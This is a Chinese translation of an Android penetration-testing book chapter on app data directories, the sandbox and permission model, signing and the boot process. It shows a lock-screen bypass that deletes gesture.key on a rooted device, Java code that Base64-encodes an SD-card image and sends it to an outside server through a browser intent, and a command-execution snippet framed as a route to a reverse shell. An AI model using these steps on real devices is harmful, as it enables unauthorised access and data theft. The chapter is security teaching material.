<blockquote><p>现在，你可能会想知道为什么它是用点分隔的单词风格，而不是常见的文件夹名称，如 FacebookApp 或 CameraApp 。 因此，这些文件夹名称指定各个应用程序的软件包名称。 软件包名称是应用程序在 Play 商店和设备上标识的唯一标识符。 例如，可能存在具有相同名称的多个相机应用或计算器应用。 因此，为了唯一地标识不同的应用，使用包名称约定而不是常规应用名称。</p></blockquote>
<blockquote><p>如果我们进入任何应用程序文件夹，我们会看到不同的子文件夹，例如文件（<strong>files</strong> ） ，<a href="https://www.secpulse.com/archives/tag/数据库" target="_blank">数据库</a>（<strong>databases </strong>） 和缓存（<strong>cache</strong> ） ，稍后我们将在第 3 章“逆向和审计 Android 应用程序”中查看。</p></blockquote>
<div id="crayon-58af8ac08c26a266624002" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
<div class="crayon-num">3</div>
<div class="crayon-num crayon-striped-num">4</div>
<div class="crayon-num">5</div>
<div class="crayon-num crayon-striped-num">6</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c26a266624002-1" class="crayon-line"><span class="crayon-v">shell</span><span class="crayon-sy">@</span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-o">/</span><span class="crayon-v">data</span><span class="crayon-o">/</span><span class="crayon-v">data</span><span class="crayon-o">/</span><span class="crayon-v">de</span><span class="crayon-sy">.</span><span class="crayon-v">trier</span><span class="crayon-sy">.</span><span class="crayon-v">infsec</span><span class="crayon-sy">.</span><span class="crayon-v">koch</span><span class="crayon-sy">.</span><span class="crayon-v">droidsheep</span> <span class="crayon-p"># ls</span></div>
<div id="crayon-58af8ac08c26a266624002-2" class="crayon-line crayon-striped-line"><span class="crayon-e">cache</span></div>
<div id="crayon-58af8ac08c26a266624002-3" class="crayon-line"><span class="crayon-e">databases</span></div>
<div id="crayon-58af8ac08c26a266624002-4" class="crayon-line crayon-striped-line"><span class="crayon-e">files</span></div>
<div id="crayon-58af8ac08c26a266624002-5" class="crayon-line"><span class="crayon-e">lib</span></div>
<div id="crayon-58af8ac08c26a266624002-6" class="crayon-line crayon-striped-line"><span class="crayon-v">shell</span><span class="crayon-sy">@</span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-o">/</span><span class="crayon-v">data</span><span class="crayon-o">/</span><span class="crayon-v">data</span><span class="crayon-o">/</span><span class="crayon-v">de</span><span class="crayon-sy">.</span><span class="crayon-v">trier</span><span class="crayon-sy">.</span><span class="crayon-v">infsec</span><span class="crayon-sy">.</span><span class="crayon-v">koch</span><span class="crayon-sy">.</span><span class="crayon-v">droidsheep</span> <span class="crayon-p">#</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>这里需要注意的一个重要的事情是，如果手机已经 root，我们可以修改文件系统中的任何文件。 对设备获取 root 意味着我们可以完全访问和控制整个设备，这意味着我们可以看到以及修改任何我们想要的文件。</p></blockquote>
<blockquote><p>最常见的安全保护之一是大多数人都想到的是模式锁定或 pin 锁，它默认存在于所有Android手机。 你可以通过访问 Settings | Security | Screen Lock 来配置自己的模式。</p></blockquote>
<blockquote><p>一旦我们设置了密码或模式锁定，我们现在将继续，将手机与 USB 连接到我们的系统。 现在，密码锁的密钥或模式锁的模式数据以名称 password.key 或 gesture.key 存储在 /data/system 。 注意，如果设备被锁定，并且 USB 调试被打开，你需要一个自定义引导加载程序来打开 USB 调试。 整个过程超出了本书的范围。 要了解有关 Android 的更多信息，请参阅 Thomas Cannon Digging 的 Defcon 演示。</p></blockquote>
<blockquote><p>因为<a href="https://www.secpulse.com/archives/tag/破解密码" target="_blank">破解密码</a>/模式将更加艰难，并且需要暴力（ 我们将看到如何解密实际数据） ，我们将简单地继续并删除该文件，这将从我们手机中删除模式保护 ：</p></blockquote>
<div id="crayon-58af8ac08c26f310100154" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c26f310100154-1" class="crayon-line"><span class="crayon-v">shell</span><span class="crayon-sy">@</span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-o">/</span><span class="crayon-v">data</span> <span class="crayon-p"># cd /data/system</span></div>
<div id="crayon-58af8ac08c26f310100154-2" class="crayon-line crayon-striped-line"><span class="crayon-v">shell</span><span class="crayon-sy">@</span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-o">/</span><span class="crayon-v">data</span><span class="crayon-o">/</span><span class="crayon-v">system</span> <span class="crayon-p"># rm gesture.key</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>所以，我们可以看到，一旦手机被 root ，几乎任何东西都可以只用手机、一根USB电缆和一个系统来完成。 我们将在本书的后续章节中更多地了解基于 USB 的利用。</p></blockquote>
<h2 id="title-2">1.3 沙箱和权限模型</h2>
<blockquote><p>为了理解 Android 沙箱，让我们举一个例子，如下图：</p></blockquote>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/310.png"><img class="alignnone size-full wp-image-56000" src="http://www.secpulse.com/wp-content/uploads/2017/02/310.png" alt="3" width="532" height="446" /></a></p>
<blockquote><p>如前图所示和前面所讨论的，Android 中的每个应用程序都在其自己的 <a href="https://www.secpulse.com/archives/tag/Dalvik 虚拟机" target="_blank">Dalvik 虚拟机</a>实例中运行。 这就是为什么，无论何时任何应用程序在我们的设备中崩溃，它只是显示强制关闭或等待选项，但其他应用程序继续顺利运行。 此外，由于每个应用程序都在其自己的实例中运行，因此除非内容提供者另有规定，否则将无法访问其他应用程序的数据。</p></blockquote>
<blockquote><p>Android 使用细粒度的权限模型，这需要应用程序在编译最终应用程序包之前预定义权限。</p></blockquote>
<blockquote><p>你必须注意到，每次从 Play 商店或任何其他来源下载应用程序时，它会在安装过程中显示一个权限屏幕，它类似于以下屏幕截图：</p></blockquote>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/410.png"><img class="alignnone size-full wp-image-56001" src="http://www.secpulse.com/wp-content/uploads/2017/02/410.png" alt="4" width="247" height="411" /></a></p>
<blockquote><p>此权限屏幕显示应用程序可以通过手机执行的所有任务的列表，例如发送短信，访问互联网和访问摄像头。 请求多于所需的权限使应用程序成为恶意软件作者的更具吸引力的目标。</p></blockquote>
<blockquote><p>Android 应用程序开发人员必须在开发应用程序时在名为 <strong>AndroidManifest.xml</strong> 的文件中指定所有这些权限。 此文件包含各种应用程序相关信息的列表，例如运行程序所需的最低Android 版本，程序包名称，活动列表（ 应用程序可见的应用程序中的界面） ，服务（ 应用程序的后台进程） ，和权限。 如果应用程序开发人员未能在<strong> AndroidManifest.xml </strong>文件中指定权限，并仍在应用程序中使用它，则应用程序将崩溃，并在用户运行它时显示强制关闭消息。</p></blockquote>
</div>
<div class="single-text">
<blockquote><p>一个正常的 <strong>AndroidManifest.xml </strong>文件看起来像下面的截图所示。 在这里，你可以使用 标记和其他标记查看所需的不同权限：</p></blockquote>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/56.png"><img class="alignnone size-full wp-image-56002" src="http://www.secpulse.com/wp-content/uploads/2017/02/56.png" alt="5" width="536" height="163" /></a></p>
<blockquote><p>如前所述，所有 Android 应用程序在安装后首次启动时都会分配一个唯一的 UID。 具有给定UID 的所有用户都属于特定组，具体取决于他们请求的权限。 例如，一个仅请求 Internet 权限的应用程序将属于 inet 组，因为 Android 中的 Internet 权限位于 <strong>inet </strong>组下。</p></blockquote>
<blockquote><p>用户（ 在这种情况下的应用程序） 可以属于多个组，具体取决于他们请求的权限。 或者换句话说，每个用户可以属于多个组，并且每个组可以具有多个用户。 这些组具有由组ID（ GID） 定义的唯一名称。 然而，开发人员可以明确地指定其他应用程序在与第一个相同的 UID 下运行。 在我们的设备中，其中的组和权限在文件 <strong>platform.xml</strong> 中指定，它位于 <strong>/system/etc/permissions/</strong> ：</p></blockquote>
<div id="crayon-58af8ac08c276263069074" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
<div class="crayon-num">3</div>
<div class="crayon-num crayon-striped-num">4</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c276263069074-1" class="crayon-line"><span class="crayon-v">shell</span><span class="crayon-sy">@</span><span class="crayon-v">grouper</span><span class="crayon-o">:</span><span class="crayon-o">/</span><span class="crayon-v">system</span><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-i">permissions</span> <span class="crayon-sy">$</span> <span class="crayon-e">cat </span><span class="crayon-v">platform</span><span class="crayon-sy">.</span><span class="crayon-v">xml</span><span class="crayon-sy">.</span> <span class="crayon-sy">.</span> <span class="crayon-sy">.</span></div>
<div id="crayon-58af8ac08c276263069074-3" class="crayon-line"><span class="crayon-sy">.</span> <span class="crayon-sy">.</span> <span class="crayon-sy">.</span> <span class="crayon-sy">[</span><span class="crayon-e">Some </span><span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">data </span><span class="crayon-e">has </span><span class="crayon-e">been </span><span class="crayon-e">stripped </span><span class="crayon-e">from </span><span class="crayon-e">here </span><span class="crayon-st">in</span> <span class="crayon-e">order </span><span class="crayon-st">to</span> <span class="crayon-e">shorten </span><span class="crayon-e">the </span><span class="crayon-e">output </span><span class="crayon-i">an</span></div>
<div id="crayon-58af8ac08c276263069074-4" class="crayon-line crayon-striped-line"><span class="crayon-i">d</span> <span class="crayon-e">make </span><span class="crayon-e">it </span><span class="crayon-v">readable</span><span class="crayon-sy">]</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>此外，这清除了对在 Android 设备中运行的本地应用程序的怀疑。 由于本地应用程序直接与处理器交互，而不是在 Dalvik 虚拟机下运行，因此它不会以任何方式影响整体安全模型。</p></blockquote>
<blockquote><p>现在，就像我们在前面部分看到的，应用程序将其数据存储在 location/data/data/[package name] 。 现在，存储应用程序数据的所有文件夹也具有相同的用户 ID，这构成 Android 安全模型的基础。 根据 UID 和文件权限，它将限制来自具有不同 UID 的其他应用程序对它的访问和修改。</p></blockquote>
<blockquote><p>在下面的代码示例中， <strong>ret </strong>包含以 Base64 格式编码存储在的 SD 卡中的图像，现在正在使用浏览器调用来上传到 <strong>attify.com</strong> 网站。 目的只是找到一种方式来在两个不同的 Android 对象之间进行通信。</p></blockquote>
<blockquote><p>我们将首先创建一个对象来存储图像，在Base64 中编码，最后将其存储在一个字符串中 <strong>imageString</strong> ：</p></blockquote>
<div id="crayon-58af8ac08c27c077346702" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
<div class="crayon-num">3</div>
<div class="crayon-num crayon-striped-num">4</div>
<div class="crayon-num">5</div>
<div class="crayon-num crayon-striped-num">6</div>
<div class="crayon-num">7</div>
<div class="crayon-num crayon-striped-num">8</div>
<div class="crayon-num">9</div>
<div class="crayon-num crayon-striped-num">10</div>
<div class="crayon-num">11</div>
<div class="crayon-num crayon-striped-num">12</div>
<div class="crayon-num">13</div>
<div class="crayon-num crayon-striped-num">14</div>
<div class="crayon-num">15</div>
<div class="crayon-num crayon-striped-num">16</div>
<div class="crayon-num">17</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c27c077346702-1" class="crayon-line"><span class="crayon-m">final</span> <span class="crayon-e">File </span><span class="crayon-v">file</span> <span class="crayon-o">=</span> <span class="crayon-r">new</span> <span class="crayon-e">File</span><span class="crayon-sy">(</span><span class="crayon-s">"/mnt/sdcard/profile.jpg"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-2" class="crayon-line crayon-striped-line"><span class="crayon-e">Uri </span><span class="crayon-v">uri</span> <span class="crayon-o">=</span> <span class="crayon-v">Uri</span><span class="crayon-sy">.</span><span class="crayon-e">fromFile</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-3" class="crayon-line"><span class="crayon-e">ContentResolver </span><span class="crayon-v">cr</span> <span class="crayon-o">=</span> <span class="crayon-e">getContentResolver</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-4" class="crayon-line crayon-striped-line"><span class="crayon-e">Bitmap </span><span class="crayon-v">bMap</span><span class="crayon-o">=</span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-5" class="crayon-line"><span class="crayon-st">try</span> <span class="crayon-sy">{</span></div>
<div id="crayon-58af8ac08c27c077346702-6" class="crayon-line crayon-striped-line"><span class="crayon-e">InputStream </span><span class="crayon-st">is</span> <span class="crayon-o">=</span> <span class="crayon-v">cr</span><span class="crayon-sy">.</span><span class="crayon-e">openInputStream</span><span class="crayon-sy">(</span><span class="crayon-v">uri</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-7" class="crayon-line"><span class="crayon-v">bMap</span> <span class="crayon-o">=</span> <span class="crayon-v">BitmapFactory</span><span class="crayon-sy">.</span><span class="crayon-e">decodeStream</span><span class="crayon-sy">(</span><span class="crayon-st">is</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-8" class="crayon-line crayon-striped-line"><span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-st">is</span> <span class="crayon-o">!=</span> <span class="crayon-t">null</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span></div>
<div id="crayon-58af8ac08c27c077346702-9" class="crayon-line"><span class="crayon-st">is</span><span class="crayon-sy">.</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-10" class="crayon-line crayon-striped-line"><span class="crayon-sy">}</span></div>
<div id="crayon-58af8ac08c27c077346702-11" class="crayon-line"><span class="crayon-sy">}</span> <span class="crayon-st">catch</span> <span class="crayon-sy">(</span><span class="crayon-i">Exception</span> <span class="crayon-v">e</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span></div>
<div id="crayon-58af8ac08c27c077346702-12" class="crayon-line crayon-striped-line"><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-s">"Error reading file"</span><span class="crayon-sy">,</span> <span class="crayon-v">e</span><span class="crayon-sy">.</span><span class="crayon-e">toString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-13" class="crayon-line"><span class="crayon-sy">}</span> <span class="crayon-i">B</span></div>
<div id="crayon-58af8ac08c27c077346702-14" class="crayon-line crayon-striped-line"><span class="crayon-e">yteArrayOutputStream </span><span class="crayon-v">baos</span> <span class="crayon-o">=</span> <span class="crayon-r">new</span> <span class="crayon-e">ByteArrayOutputStream</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-15" class="crayon-line"><span class="crayon-v">bMap</span><span class="crayon-sy">.</span><span class="crayon-e">compress</span><span class="crayon-sy">(</span><span class="crayon-v">Bitmap</span><span class="crayon-sy">.</span><span class="crayon-v">CompressFormat</span><span class="crayon-sy">.</span><span class="crayon-v">JPEG</span><span class="crayon-sy">,</span> <span class="crayon-cn">100</span><span class="crayon-sy">,</span> <span class="crayon-v">baos</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-16" class="crayon-line crayon-striped-line"><span class="crayon-t">byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span> <span class="crayon-v">b</span> <span class="crayon-o">=</span> <span class="crayon-v">baos</span><span class="crayon-sy">.</span><span class="crayon-e">toByteArray</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
<div id="crayon-58af8ac08c27c077346702-17" class="crayon-line"><span class="crayon-t">String</span> <span class="crayon-v">imageString</span> <span class="crayon-o">=</span> <span class="crayon-v">Base64</span><span class="crayon-sy">.</span><span class="crayon-e">encodeToString</span><span class="crayon-sy">(</span><span class="crayon-v">b</span><span class="crayon-sy">,</span><span class="crayon-v">Base64</span><span class="crayon-sy">.</span><span class="crayon-st">DEFAULT</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>最后，我们将启动浏览器将数据发送到我们的服务器，我们有一个 <strong>.php</strong> 文件侦听传入的数据：</p></blockquote>
<div id="crayon-58af8ac08c281261042230" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c281261042230-1" class="crayon-line"><span class="crayon-e">startActivity</span><span class="crayon-sy">(</span><span class="crayon-r">new</span> <span class="crayon-e">Intent</span><span class="crayon-sy">(</span><span class="crayon-v">Intent</span><span class="crayon-sy">.</span><span class="crayon-v">ACTION_VIEW</span><span class="crayon-sy">,</span><span class="crayon-v">Uri</span><span class="crayon-sy">.</span><span class="crayon-e">parse</span><span class="crayon-sy">(</span><span class="crayon-s">"http://attify.com/up.php?u="</span><span class="crayon-o">+</span><span class="crayon-e">im</span></div>
<div id="crayon-58af8ac08c281261042230-2" class="crayon-line crayon-striped-line"><span class="crayon-v">ageString</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
<p>&nbsp;</p>
</div>
<blockquote><p>我们还可以执行命令并以相同的方式将输出发送到远程服务器。 但是，这里需要注意的一点是 shell 应该在应用程序的用户下运行：</p></blockquote>
<div id="crayon-58af8ac08c285892023463" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
<div class="crayon-num">3</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c285892023463-1" class="crayon-line"><span class="crayon-c">// To execute commands :</span></div>
<div id="crayon-58af8ac08c285892023463-2" class="crayon-line crayon-striped-line"><span class="crayon-t">String</span> <span class="crayon-v">str</span> <span class="crayon-o">=</span> <span class="crayon-s">"cat /proc/version"</span><span class="crayon-sy">;</span> <span class="crayon-c">//command to be executed is stored in str.</span></div>
<div id="crayon-58af8ac08c285892023463-3" class="crayon-line"><span class="crayon-v">process</span> <span class="crayon-o">=</span> <span class="crayon-v">Runtime</span><span class="crayon-sy">.</span><span class="crayon-e">getRuntime</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">exec</span><span class="crayon-sy">(</span><span class="crayon-v">str</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>这是一个有趣的现象，因为攻击者可以获得一个反向 shell（ 这是一个从设备到系统的双向连接，可以用于执行命令） ，而不需要任何类型的权限。</p></blockquote>
<h2 id="title-3">1.4 应用签名</h2>
<blockquote><p>应用程序签名是 Android 的独特特性之一，由于其开放性和开发人员社区，它取得了成功。</p></blockquote>
<blockquote><p>Play 商店中有超过一百万个应用。 在 Android 中，任何人都可以通过下载 Android SDK 创建 Android 应用，然后将其发布到 Play 商店。 通常有两种类型的证书签名机制。 一个是由管理证书颁发机构（ CA） 签名的，另一个是自签名证书。 没有中间证书颁发机构（ CA） ，而开发人员可以创建自己的证书并为应用程序签名。</p></blockquote>
<blockquote><p>在 Apple 的 iOS 应用程序模型中可以看到 CA 签名，其中开发者上传到 App Store 的每个应用程序都经过验证，然后由 Apple 的证书签名。 一旦下载到设备，设备将验证应用程序是否由 Apple 的 CA 签名，然后才允许应用程序运行。</p></blockquote>
<blockquote><p>但是，在 Android 中是相反的。 没有证书颁发机构; 而是开发人员的自创建证书可以签署应用程序。 应用程序上传完成后，会由 Google Bouncer 进行验证，这是一个虚拟环境，用于检查应用程序是否是恶意或合法的。 检查完成后，应用就会显示在 Play 商店中。 在这种情况下，Google 不会对该应用程序进行签名。 开发人员可以使用 Android SDK 附带的工具（ 称为 keytool ） 创建自己的证书，或者使用 Eclipse 的 GUI 创建证书。</p></blockquote>
<blockquote><p>因此，在 Android 中，一旦开发人员使用他创建的证书签名了应用程序，他需要将证书的密钥保存在安全的位置，以防止其他人窃取他的密钥并使用开发人员的证书签署其他应用程序。 如果我们有一个 Android 应用程序（.apk ） 文件，我们可以检查应用程序的签名，并找到使用称为 jarsigner 的工具签署应用程序的人，这个工具是 Android SDK 自带的：</p></blockquote>
<div id="crayon-58af8ac08c28b296885272" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c28b296885272-1" class="crayon-line"><span class="crayon-sy">$</span> <span class="crayon-v">jarsigner</span> <span class="crayon-o">-</span><span class="crayon-v">verify</span> <span class="crayon-o">-</span><span class="crayon-v">certs</span> <span class="crayon-o">-</span><span class="crayon-e">verbose </span><span class="crayon-v">testing</span><span class="crayon-sy">.</span><span class="crayon-v">apk</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>以下是在应用程序上运行上述命令并获取签名的信息的屏幕截图：</p></blockquote>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/66.png"><img class="alignnone size-full wp-image-56003" src="http://www.secpulse.com/wp-content/uploads/2017/02/66.png" alt="6" width="585" height="111" /></a></p>
<blockquote><p>此外，解压缩 <strong>.apk</strong> 文件后，可以解析 <strong><a href="https://www.secpulse.com/archives/tag/META-INF" target="_blank">META-INF</a></strong> 文件夹中出现的 CERT.RSA 文件的 ASCII 内容，以获取签名，如以下命令所示：</p></blockquote>
<div id="crayon-58af8ac08c290543599786" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
<div class="crayon-num crayon-striped-num">2</div>
<div class="crayon-num">3</div>
<div class="crayon-num crayon-striped-num">4</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c290543599786-1" class="crayon-line"><span class="crayon-sy">$</span> <span class="crayon-e">unzip </span><span class="crayon-v">testing</span><span class="crayon-sy">.</span><span class="crayon-i">apk</span></div>
<div id="crayon-58af8ac08c290543599786-2" class="crayon-line crayon-striped-line"><span class="crayon-sy">$</span> <span class="crayon-e">cd </span><span class="crayon-v">META</span><span class="crayon-o">-</span><span class="crayon-i">INF</span></div>
<div id="crayon-58af8ac08c290543599786-3" class="crayon-line"><span class="crayon-sy">$</span> <span class="crayon-e">openssl </span><span class="crayon-v">pkcs7</span> <span class="crayon-o">-</span><span class="crayon-st">in</span> <span class="crayon-v">CERT</span><span class="crayon-sy">.</span><span class="crayon-v">RSA</span> <span class="crayon-o">-</span><span class="crayon-v">print_certs</span> <span class="crayon-o">-</span><span class="crayon-e">inform </span><span class="crayon-v">DER</span> <span class="crayon-o">-</span><span class="crayon-e">out </span><span class="crayon-v">out</span><span class="crayon-sy">.</span><span class="crayon-i">cer</span></div>
<div id="crayon-58af8ac08c290543599786-4" class="crayon-line crayon-striped-line"><span class="crayon-sy">$</span> <span class="crayon-e">cat </span><span class="crayon-v">out</span><span class="crayon-sy">.</span><span class="crayon-v">cer</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>这在检测和分析未知的 Android .apk 示例时非常有用。 因此，我们可以使用它获得签署人以及其他详细信息。</p></blockquote>
<h2 id="title-4">1.5 Android 启动流程</h2>
<blockquote><p>在 Android 中考虑安全性时最重要的事情之一是 Android 启动过程。 整个引导过程从引导加载程序开始，它会反过来启动 init 过程 - 第一个用户级进程。</p></blockquote>
<blockquote><p>所以，任何引导加载程序的变化，或者如果我们加载另一个，而不是默认存在的引导加载程序，我们实际上可以更改在设备上加载的内容。 引导加载程序通常是特定于供应商的，每个供应商都有自己的修改版本的引导加载程序。 通常，默认情况下，此功能通过锁定引导加载程序来禁用，它只允许供应商指定的受信任内核在设备上运行。 为了将自己的 ROM 刷到Android 设备，需要解锁引导加载程序。 解锁引导加载程序的过程可能因设备而异。 在某些情况下，它也可能使设备的保修失效。</p></blockquote>
<blockquote><p>注 在Nexus 7 中，它就像使用命令行中的 fastboot 工具一样简单，如下所示：</p></blockquote>
<div id="crayon-58af8ac08c295173206376" class="crayon-syntax crayon-theme-coy crayon-font-monaco crayon-os-mac print-yes notranslate">
<blockquote>
<div class="crayon-main">
<table class="crayon-table">
<tbody>
<tr class="crayon-row">
<td class="crayon-nums ">
<div class="crayon-nums-content">
<div class="crayon-num">1</div>
</div>
</td>
<td class="crayon-code">
<div class="crayon-pre">
<div id="crayon-58af8ac08c295173206376-1" class="crayon-line"><span class="crayon-sy">$</span> <span class="crayon-e">fastboot </span><span class="crayon-e">oem </span><span class="crayon-v">unlock</span></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
</div>
<blockquote><p>在其他设备中，可能需要更多精力。 我们看看如何创建自己的 Bootloader 并在本书的后续章节中使用它。</p></blockquote>
<blockquote><p>回到启动过程，在引导加载程序启动内核并启动 init 之后，它挂载了 Android 系统运行所需的一些重要目录，例如 /dev ， /sys 和 /proc 。 此外， init 从配置文件 init.rc 和 init.[device-name].rc 中获取自己的配置，在某些情况下从位于相同位置的 .sh 文件获取自己的配置。</p></blockquote>
<blockquote><p>如果我们对 init.rc 文件执行 cat ，我们可以看到 init 加载自身时使用的所有规范，如下面的截图所示：</p></blockquote>
<blockquote><p>init 进程的责任是启动其他必需的组件，例如负责 ADB 通信和卷守护程序（ vold） 的 adb守护程序（ adbd） 。</p></blockquote>
<blockquote><p>加载时使用的一些属性位于 build.prop ，它位于 location/system 。 当你在 Android 设备上看到 Android logo 时，就完成了 init 进程的加载。 正如我们在下面的截图中可以看到的，我们通过检查 build.prop 文件来获取设备的具体信息：</p></blockquote>
<blockquote><p>一旦所有的东西被加载， init 最后会加载一个称为 Zygote 的进程，负责以最小空间加载Dalvik 虚拟机和共享库，来加快整个进程的加载速度。 此外，它继续监听对自己的新调用，以便在必要时启动更多 DVM。 这是当你在设备上看到 Android 开机动画时的情况。</p></blockquote>
<blockquote><p>一旦完全启动，Zygote 派生自己并启动系统，加载其他必要的 Android 组件，如活动管理器。 一旦完成整个引导过程，系统发送 BOOT_COMPLETED 的广播，许多应用程序可能使用称为广播接收器的 Android 应用程序中的组件来监听。 当我们在第 3 章“逆向和审计 Android 应用程序”中分析恶意软件和应用程序时，我们将进一步了解广播接收器。</p></blockquote>
<p><strong>总结</strong></p>
<blockquote><p>在本章中，我们为学习 Android 渗透测试建立了基础。 我们还了解 Android 的内部结构及其安全体系结构。在接下来的章节中，我们将建立一个 Android 渗透测试实验室，并使用这些知识执行更多的技术任务，来渗透 Android 设备和应用程序。 我们还将了解有关 ADB 的更多信息，并使用它来收集和分析设备中的信息。</p></blockquote>
<p>【本文由<span style="color: #ff6600">飞龙使者</span>编译 <a href="http://www.kanxue.com/?article-read-691.htm" target="_blank">看雪学院</a>原创，安全脉搏编整理发布】<b>   </b></p>
</div>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
